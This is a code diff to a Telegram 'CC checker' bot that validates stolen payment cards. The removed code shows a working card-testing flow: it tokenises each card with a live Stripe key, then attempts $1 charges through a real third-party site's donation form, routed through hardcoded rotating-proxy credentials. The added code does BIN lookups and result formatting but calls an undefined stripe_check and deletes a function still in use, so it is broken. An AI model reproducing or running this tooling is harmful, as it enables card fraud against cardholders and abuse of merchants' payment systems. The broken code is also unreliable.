@@ -7,12 +7,12 @@ import random
 import yaml
 import asyncio
 import re
+import telebot
 
 from aiogram import Bot, Dispatcher, executor, types
 from aiogram.utils.exceptions import Throttled
 from aiogram.contrib.fsm_storage.memory import MemoryStorage
 from bs4 import BeautifulSoup as bs
-
 
 # Configure vars get from env or config.yml
 CONFIG = yaml.load(open('config.yml', 'r'), Loader=yaml.SafeLoader)
@@ -29,6 +29,7 @@ dp = Dispatcher(bot, storage=storage)
 
 # Configure logging
 logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 # BOT INFO
 loop = asyncio.get_event_loop()
@@ -40,8 +41,8 @@ BOT_ID = bot_info.id
 
 # USE YOUR ROTATING PROXY API IN DICT FORMAT http://user:pass@providerhost:port
 proxies = {
-           'http': 'http://qnuomzzl-rotate:4i44gnayqk7c@p.webshare.io:80/',
-           'https': 'http://qnuomzzl-rotate:4i44gnayqk7c@p.webshare.io:80/'
+    'http': 'http://qnuomzzl-rotate:4i44gnayqk7c@p.webshare.io:80/',
+    'https': 'http://qnuomzzl-rotate:4i44gnayqk7c@p.webshare.io:80/'
 }
 
 session = requests.Session()
@@ -55,16 +56,45 @@ Name = f'{First}+{Last}'
 Email = f'{First}.{Last}@gmail.com'
 UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'
 
+# Stripe Checking
+approved_cards = []
+BIN_LOOKUP_URL = "https://lookup.binlist.net/"
 
-async def is_owner(user_id):
-    return user_id == OWNER
+def bin_lookup(card_number):
+    bin_number = card_number[:6]
+    url = BIN_LOOKUP_URL + bin_number
+    try:
+        response = requests.get(url)
+        if response.status_code == 200:
+            data = response.json()
+            issuer = data.get("bank", {}).get("name", "Unknown Bank")
+            country = data.get("country", {}).get("name", "Unknown Country")
+            card_type = data.get("type", "Unknown Type")
+            return issuer, country, card_type
+        else:
+            logger.warning(f"BIN lookup failed with status code: {response.status_code}")
+            return "Unknown Bank", "Unknown Country", "Unknown Type"
+    except requests.exceptions.RequestException as e:
+        logger.error(f"Error during BIN lookup: {str(e)}")
+        return "Unknown Bank", "Unknown Country", "Unknown Type"
 
-async def is_card_valid(card_number: str) -> bool: return (sum( map(lambda n: n[1] + (n[0] % 2 == 0) * (n[1] - 9 * (n[1] > 4)), enumerate(map(int, card_number[:-1]))) ) + int(card_number[-1])) % 10 == 0
+def format_response(cc, gateway, response, auth, issuer, country, card_type, time_taken):
+    card_info = f"𝗖𝗮𝗿𝗱: {cc}\n"
+    gateway_info = f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gateway}\n"
+    response_info = f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response}\n"
+    auth_info = f"Auth: {auth}\n"
+    info = f"𝗜𝗻𝗳𝗼: {card_type} - {issuer}\n"
+    issuer_info = f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}\n"
+    country_info = f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country} 🇺🇸\n"
+    time_info = f"𝗧𝗶𝗺𝗲: {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
+    if response == "Approved":
+        return f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n{card_info}{gateway_info}{response_info}{auth_info}{info}{issuer_info}{country_info}{time_info}"
+    else:
+        return f"DECLINED ❌\n{card_info}{gateway_info}{response_info}{auth_info}{info}{issuer_info}{country_info}{time_info}"
 
-
+# Command Handlers
 @dp.message_handler(commands=['start', 'help'], commands_prefix=PREFIX)
 async def helpstr(message: types.Message):
-    # await message.answer_chat_action('typing')
     keyboard_markup = types.InlineKeyboardMarkup(row_width=3)
     btns = types.InlineKeyboardButton("Bot Source", url="https://github.com/xbinner18/Mrbannker")
     keyboard_markup.row(btns)
@@ -73,8 +103,7 @@ async def helpstr(message: types.Message):
 Hello {FIRST}, Im {BOT_NAME}
 U can find my Boss  <a href="tg://user?id={OWNER}">HERE</a>
 Cmds /chk /info /bin'''
-    await message.answer(MSG, reply_markup=keyboard_markup,
-                        disable_web_page_preview=True)
+    await message.answer(MSG, reply_markup=keyboard_markup, disable_web_page_preview=True)
 
 
 @dp.message_handler(commands=['info', 'id'], commands_prefix=PREFIX)
@@ -162,113 +191,11 @@ async def ch(message: types.Message):
             return await message.reply('<b>BLACKLISTED BIN</b>')
         if await is_card_valid(ccn) != True:
             return await message.reply('<b>Invalid luhn algorithm</b>')
-        # get guid muid sid
-        headers = {
-            "user-agent": UA,
-            "accept": "application/json, text/plain, */*",
-            "content-type": "application/x-www-form-urlencoded"
-        }
 
-        # b = session.get('https://ip.seeip.org/', proxies=proxies).text
+        # Make Stripe request
+        result = stripe_check(ccn)
 
-        m = s.post('https://m.stripe.com/6', headers=headers)
-        r = m.json()
-        Guid = r['guid']
-        Muid = r['muid']
-        Sid = r['sid']
-
-        postdata = {
-            "guid": Guid,
-            "muid": Muid,
-            "sid": Sid,
-            "key": "pk_live_Ng5VkKcI3Ur3KZ92goEDVRBq",
-            "card[name]": Name,
-            "card[number]": ccn,
-            "card[exp_month]": mm,
-            "card[exp_year]": yy,
-            "card[cvc]": cvv
-        }
-
-        HEADER = {
-            "accept": "application/json",
-            "content-type": "application/x-www-form-urlencoded",
-            "user-agent": UA,
-            "origin": "https://js.stripe.com",
-            "referer": "https://js.stripe.com/",
-            "accept-language": "en-US,en;q=0.9"
-        }
-
-        pr = s.post('https://api.stripe.com/v1/tokens',
-                          data=postdata, headers=HEADER)
-        Id = pr.json()['id']
-        if pr.status_code != 200:
-            return await message.reply("<b>Site is Dead</b>")
-        nonce = s.get("https://www.hwstjohn.com/pay-now/")
-        form = re.findall(r'formNonce" value="([^\'" >]+)', nonce.text)
-        # hmm
-        load = {
-    "action": "wp_full_stripe_payment_charge",
-    "formName": "default",
-    "formNonce": form,  # Se agregó la coma
-    "fullstripe_name": "Larry",  # Se colocaron comillas en "Larry"
-    "fullstripe_email": "emesa302@gmail.com",
-    "fullstripe_custom_amount": "1",
-    "fullstripe_amount_index": 0,
-    "stripeToken": Id
-}
-
-        header = {
-            "accept": "application/json, text/javascript, */*; q=0.01",
-            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "user-agent": UA,
-            "accept-language": "en-US,en;q=0.9"
-        }
-
-        rx = s.post('https://www.hwstjohn.com/wp-admin/admin-ajax.php',
-                          data=load, headers=header)
-        msg = rx.json()['msg']
-
-        toc = time.perf_counter()
-
-        if 'true' in rx.text:
-            return await message.reply(f'''
-✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ #CHARGED 1$
-<b>MSG</b>➟ {msg}
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
-<b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
-
-        if 'security code' in rx.text:
-            return await message.reply(f'''
-✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ #CCN
-<b>MSG</b>➟ {msg}
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
-<b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
-
-        if 'false' in rx.text:
-            return await message.reply(f'''
-❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ #Declined
-<b>MSG</b>➟ {msg}
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
-<b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
-
-        await message.reply(f'''
-❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ DEAD
-<b>MSG</b>➟ {rx.text}
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
-<b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
-
+        await message.reply(result)
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True, loop=loop)
